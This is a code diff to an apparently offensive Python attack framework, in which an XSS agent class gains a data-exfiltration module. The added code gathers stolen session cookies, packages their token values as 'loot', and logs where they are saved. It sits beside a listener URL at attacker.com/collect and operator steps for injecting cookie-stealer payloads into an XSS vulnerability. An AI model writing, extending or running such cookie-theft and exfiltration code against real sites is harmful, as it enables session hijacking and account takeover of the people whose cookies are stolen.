@@ -8,6 +8,7 @@ from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 from core.base_agent import BaseAgent
 from core.data_models import AgentData, AttackPhase
 from core.logger import log
+from core.data_exfiltration import DataExfiltrator
 
 
 class XSS_Agent(BaseAgent):
@@ -33,6 +34,7 @@ class XSS_Agent(BaseAgent):
         self.payloads = self._load_payloads()
         self.listener_url = "http://attacker.com/collect"  # Replace with actual listener
         os.makedirs(self.results_dir, exist_ok=True)
+        self.exfiltrator = DataExfiltrator(workspace_dir="/home/ubuntu/dlnk/workspace")
 
     def _load_payloads(self) -> Dict[str, List[str]]:
         """โหลด XSS payloads แบ่งตามประเภท"""
@@ -383,10 +385,32 @@ class XSS_Agent(BaseAgent):
         
         payloads = self.payloads["cookie_stealer"]
         
+        # Simulate stolen cookies (in real scenario, this would come from listener)
+        stolen_cookies = context.get("stolen_cookies", [])
+        
+        # Exfiltrate session tokens if available
+        loot = None
+        if stolen_cookies:
+            session_tokens = [
+                {
+                    "token": cookie.get("value", ""),
+                    "name": cookie.get("name", ""),
+                    "domain": cookie.get("domain", ""),
+                }
+                for cookie in stolen_cookies
+            ]
+            loot = await self.exfiltrator.exfiltrate_session_tokens(
+                target=url,
+                tokens=session_tokens
+            )
+            log.success(f"[XSS_Agent] Session tokens saved to: {loot['file']}")
+        
         result = {
             "success": True,
             "payloads": payloads,
             "listener_url": self.listener_url,
+            "stolen_count": len(stolen_cookies),
+            "loot": loot,
             "instructions": [
                 "1. Set up a listener at the listener_url",
                 "2. Inject one of these payloads into the XSS vulnerability",
